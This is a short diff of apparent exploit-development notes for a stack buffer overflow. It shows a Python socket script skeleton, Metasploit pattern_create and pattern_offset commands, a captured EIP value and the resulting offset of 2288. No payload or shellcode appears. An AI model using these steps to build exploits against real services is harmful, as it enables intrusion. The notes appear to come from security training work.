@@ -1,4 +1,4 @@
-msf-pattern_create -l 2560
+CREATE PATTERN msf-pattern_create -l 2560
 
 #!/usr/bin/python
 import socket
@@ -19,3 +19,12 @@ try:
 
 except:
   print "\nCould not connect!"
+  
+  
+  EIP VALUE is 33794332
+  
+  FIND EIP CHARACTERS
+  
+  msf-pattern_offset -l 2560 -q 33794332
+  [*] Exact match at offset 2288
+
